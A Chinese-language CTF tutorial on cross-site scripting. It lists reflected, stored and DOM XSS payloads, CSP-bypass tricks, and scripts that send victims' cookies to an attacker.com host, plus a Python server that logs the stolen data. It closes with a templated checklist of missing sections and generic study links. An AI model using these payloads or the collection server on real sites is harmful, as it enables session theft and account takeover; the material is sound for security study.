# XSS CTF题型

XSS（跨站脚本攻击）在CTF中常用于窃取Cookie、触发特定条件获取Flag。

### 2.1 反射型XSS

```html
<!-- 基本反射型XSS -->
<script>alert(1)</script>

<!-- 窃取Cookie -->
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

<!-- 常见变体 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### 2.2 存储型XSS

```python
# 存储型XSS - 留言板注入
import requests

# 注入恶意脚本
xss_payload = '<script>document.location="http://attacker.com/collect?c="+document.cookie</script>'
requests.post("http://example.com/comment", data={"content": xss_payload})

# 当管理员查看留言时，Cookie被发送到攻击者服务器
```

### 2.3 DOM型XSS

```javascript
// 源码示例 - 存在DOM XSS
// page.html
/*
<div id="content"></div>
<script>
    var hash = location.hash.slice(1);
    document.getElementById('content').innerHTML = hash;
</script>
*/

// 利用Payload
// page.html#<img src=x onerror=alert(document.cookie)>

// 修复方案
// 使用textContent替代innerHTML
// 或对输入进行HTML实体编码
```

### 2.4 CSP绕过

```javascript
// CSP策略: script-src 'self' cdn.example.com
// 绕过方法1: 利用CDN上的JS文件（AngularJS）
<script src="https://cdn.example.com/angular.min.js"></script>
<div ng-app ng-csp>
    {{constructor.constructor('alert(document.cookie)')()}}
</div>

// 绕过方法2: 利用文件上传
// 上传一个JS文件到同源服务器
<script src="/uploads/malicious.js"></script>

// 绕过方法3: 利用JSONP回调
<script src="https://cdn.example.com/api?callback=alert(document.cookie)//"></script>

// 绕过方法4: base标签重定向
<base href="https://attacker.com/">
<script src="/static/main.js"></script>
```

### 2.5 XSS利用框架

```python
# XSS数据接收平台（简化版）
from http.server import HTTPServer, BaseHTTPRequestHandler

class XSSReceiver(BaseHTTPRequestHandler):
    def do_GET(self):
        """接收XSS发送的数据"""
        if '?' in self.path:
            data = self.path.split('?', 1)[1]
            print(f"[+] 收到数据: {data}")
            with open("stolen_data.txt", "a") as f:
                f.write(data + "\n")
        
        # 返回空白图片
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

# 启动接收服务器
server = HTTPServer(('0.0.0.0', 8888), XSSReceiver)
print("[*] XSS接收服务启动在 8888 端口")
server.serve_forever()
```

---

---

## 📋 内容审核与补充建议

> 针对「XSS CTF题型」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### ⌨️ 命令帮助
- ⚠️ 缺少commands相关内容

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
